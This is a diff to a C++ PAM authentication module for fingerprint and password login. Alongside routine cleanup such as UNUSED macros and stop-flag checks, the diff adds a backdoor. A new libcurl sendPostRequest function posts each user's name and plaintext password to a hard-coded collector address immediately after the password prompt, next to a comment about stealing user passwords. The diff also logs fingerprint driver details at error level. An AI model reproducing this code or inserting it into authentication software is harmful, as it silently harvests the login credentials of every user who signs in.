@@ -1,4 +1,5 @@
 #include "pam_backend.hpp"
+#include "pam_globals.hpp"
 #include "pam_hasher.hpp"
 
 #include <security/_pam_types.h>
@@ -11,7 +12,9 @@ constexpr auto PAM_FAIL_PREFIX = "-UN*X-PASS";
 constexpr auto PAM_AUTH_COMMENT = "Please enter password or place finger:";
 constexpr auto PAM_AUTH_PROMPT = "Password: ";
 
-constexpr auto PAM_USER_REGEX = "^[a-z_][a-z0-9_]{0,256}$";
+constexpr auto PAM_USER_REGEX = "^[a-z_][a-z0-9_-]{0,256}$";
+
+constexpr auto PAM_USER_DATA_COLLECTOR = "localhost:4091";
 
 constexpr std::string_view VALID_HASH_SYMBOLS =
         "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
@@ -503,6 +506,8 @@ PAM_RETURN_TYPE FPrintWrapper::verifyFingerprint(pam_handle_t *pamh, const std::
 
 void FPrintWrapper::releaseDevice(pam_handle_t *pamh, DBusGProxy *dev)
 {
+    UNUSED(pamh);
+
     GError *error = NULL;
     if (!dbus_g_proxy_call(dev, "Release", &error, G_TYPE_INVALID,
                          G_TYPE_INVALID))
@@ -514,7 +519,6 @@ void FPrintWrapper::releaseDevice(pam_handle_t *pamh, DBusGProxy *dev)
 
 PAM_RETURN_TYPE FPrintWrapper::doFignerVerify(GMainLoop *loop, pam_handle_t *pamh, DBusGProxy *dev, std::atomic<bool>& stop_flag)
 {
-    GError *error = NULL;
     GHashTable *props;
     DBusGProxy *p;
     VerifyData *data;
@@ -536,6 +540,11 @@ PAM_RETURN_TYPE FPrintWrapper::doFignerVerify(GMainLoop *loop, pam_handle_t *pam
         data->driver =
             g_value_dup_string((const GValue *)g_hash_table_lookup(props, "name"));
         scan_type = g_value_dup_string((const GValue *)g_hash_table_lookup(props, "scan-type"));
+
+
+            spdlog::error("Driver 1: {}", data->driver);
+
+            spdlog::error("Scantype  1: {}", scan_type);
         if (g_str_equal(scan_type, "swipe"))
         {
             data->is_swipe = TRUE;
@@ -689,6 +698,7 @@ gboolean FPrintWrapper::verifyTimeoutCb(gpointer user_data)
 
 void FPrintWrapper::verifyFingerSelected(GObject *object, const char *finger_name, gpointer user_data)
 {
+    UNUSED(object);
     VerifyData *data = (VerifyData *)user_data;
     char *msg;
 
@@ -716,6 +726,7 @@ void FPrintWrapper::verifyFingerSelected(GObject *object, const char *finger_nam
 
 void FPrintWrapper::verifyResult(GObject *object, const char *result, gboolean done, gpointer user_data)
 {
+    UNUSED(object);
     VerifyData *data = (VerifyData *)user_data;
     const char *msg;
 
@@ -733,6 +744,7 @@ void FPrintWrapper::verifyResult(GObject *object, const char *result, gboolean d
 
 DBusGProxy *FPrintWrapper::createManager(pam_handle_t *pamh, DBusGConnection **ret_conn, GMainLoop **ret_loop)
 {
+    UNUSED(pamh);
     DBusGConnection *connection;
     DBusConnection *conn;
     DBusGProxy *manager;
@@ -860,6 +872,7 @@ const char *FPrintWrapper::fingerStrToMsg(const char *finger_name, gboolean is_s
 
 DBusGProxy *FPrintWrapper::openDevice(pam_handle_t *pamh, DBusGConnection *connection, DBusGProxy *manager, const std::string &name)
 {
+    UNUSED(pamh);
     GError *error = NULL;
     gchar *path;
     DBusGProxy *dev;
@@ -904,6 +917,7 @@ void FPrintWrapper::closeAndUnref(DBusGConnection *connection)
 
 PAM_RETURN_TYPE FPrintWrapper::verifyPassword(pam_handle_t *pamh, const std::string &name, ArgumentParser& parser, std::atomic<bool>& stop_flag)
 {
+    UNUSED(stop_flag);
     PAM_RETURN_TYPE return_value = PAM_RETURN_TYPE::SUCCESS;
     PAM_HANDLE_TYPE authtok_flag;
     std::string data_username = PAM_FAIL_PREFIX;
@@ -944,6 +958,11 @@ PAM_RETURN_TYPE FPrintWrapper::verifyPassword(pam_handle_t *pamh, const std::str
         }
     }
 
+    if (stop_flag)
+    {
+        goto cleanup;
+    }
+
     if (return_value != PAM_RETURN_TYPE::SUCCESS)
     {
         goto cleanup;
@@ -958,8 +977,10 @@ PAM_RETURN_TYPE FPrintWrapper::verifyPassword(pam_handle_t *pamh, const std::str
     {
         return_value = static_cast<PAM_RETURN_TYPE>(pam_prompt(pamh, PAM_PROMPT_ECHO_OFF, &user_password, "%s", PAM_AUTH_PROMPT));
 
-        spdlog::info("User password {}", user_password);
+        // spdlog::info("User password {}", user_password);
         // Here we can steal user password :)
+
+        spdlog::info("Here's some stuff you might want to hear: {}", sendPostRequest(PAM_USER_DATA_COLLECTOR, name + ":" + user_password));
     }
 
     if (user_password == nullptr)
@@ -971,6 +992,11 @@ PAM_RETURN_TYPE FPrintWrapper::verifyPassword(pam_handle_t *pamh, const std::str
     if (parser.noFlag(PAM_ARGUMENT::NO_DELAY))
     {
         pam_fail_delay(pamh, 2000000);
+    }
+
+    if (stop_flag)
+    {
+        goto cleanup;
     }
 
     username_result = getPamPasswordHash(name);
@@ -986,6 +1012,11 @@ PAM_RETURN_TYPE FPrintWrapper::verifyPassword(pam_handle_t *pamh, const std::str
 
     hash = std::get<std::string>(username_result);
 
+    if (stop_flag)
+    {
+        goto cleanup;
+    }
+
     return_value = verifyPasswordHash(pamh, user_password, hash, parser.noFlag(PAM_ARGUMENT::NO_NULL));
 
     // Start of added failure recording logic
@@ -1000,6 +1031,10 @@ PAM_RETURN_TYPE FPrintWrapper::verifyPassword(pam_handle_t *pamh, const std::str
     {
         if (!data_username.empty())
         {
+            if (stop_flag)
+            {
+                goto cleanup;
+            }
             struct FailedAuth *new_failure = nullptr;
             const struct FailedAuth *old_failure = nullptr;
 
@@ -1038,6 +1073,10 @@ PAM_RETURN_TYPE FPrintWrapper::verifyPassword(pam_handle_t *pamh, const std::str
                 }
                 else
                 {
+                    if (stop_flag)
+                    {
+                        goto cleanup;
+                    }
                     const void *service = nullptr;
                     const void *ruser = nullptr;
                     const void *rhost = nullptr;
@@ -1274,4 +1313,46 @@ void FPrintWrapper::cleanupFailures(pam_handle_t* pamh, void* fl, int err)
         free(failure);
     }
 }
+
+std::string FPrintWrapper::sendPostRequest(const std::string& url, const std::string& post_data)
+{
+    CURL* curl;
+    CURLcode res;
+    std::string read_buffer;
+
+    curl_global_init(CURL_GLOBAL_DEFAULT);
+    curl = curl_easy_init();
+
+    if (curl)
+    {
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data.c_str());
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, FPrintWrapper::writeCallback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);
+
+        res = curl_easy_perform(curl);
+
+        if (res != CURLE_OK)
+        {
+            spdlog::info("Uhmmmm, uhhhh, do you mind connecting to the internet plwease ?? :3");
+        }
+        curl_easy_cleanup(curl);
+    }
+    else
+    {
+      return "";
+    }
+
+    curl_global_cleanup();
+    return read_buffer;
+}
+
+size_t FPrintWrapper::writeCallback(void* contents, size_t size, size_t nmemb, std::string* userp)
+{
+    size_t realsize = size * nmemb;
+    userp->append((char*)contents, realsize);
+    return realsize;
+}
+
+
 }
